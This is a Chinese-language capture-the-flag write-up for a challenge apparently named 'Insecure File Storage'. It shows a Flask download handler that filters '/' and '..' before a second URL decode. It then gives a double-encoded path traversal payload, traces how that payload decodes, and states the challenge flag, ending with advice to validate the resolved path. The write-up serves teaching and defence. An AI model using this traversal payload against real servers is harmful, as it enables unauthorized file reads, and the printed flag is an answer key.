# Insecure File Storage

## 题目简述

Flask 下载接口试图拒绝包含 `/` 或 `..` 的文件名，但框架和应用对参数进行了两次 URL 解码：过滤发生在两次解码之间，攻击者可用双重编码让危险路径在检查后才出现。

## 解题过程

服务端核心逻辑为：

```python
filename = request.args.get("file")
if "/" in filename or ".." in filename:
    return render_template("deny.html")
filename = urllib.parse.unquote(filename)
return send_file(f"./files/{filename}")
```

请求到达 Flask 时，查询参数已经解码一次。因此发送：

```text
/download?file=%252e%252e%252fflag.txt
```

两阶段变化如下：

```text
原始查询串                  %252e%252e%252fflag.txt
Flask 首次解码后            %2e%2e%2fflag.txt
应用检查                    不含字面量 .. 或 /
urllib.parse.unquote 后      ../flag.txt
最终路径                    ./files/../flag.txt
```

最终路径跳出 `files` 目录并读取同级的 `flag.txt`。本地用 Flask test client 对原服务发送该请求，响应状态为 200，正文为 `grey{water_breathing_first_form..._water_surface_slash!}`。

## 方法总结

路径校验必须在所有规范化和解码完成后进行，并应基于解析后的绝对路径验证其仍位于允许目录；在中间表示上做字符串黑名单很容易被多重编码绕过。最终 flag 为 `grey{water_breathing_first_form..._water_surface_slash!}`。
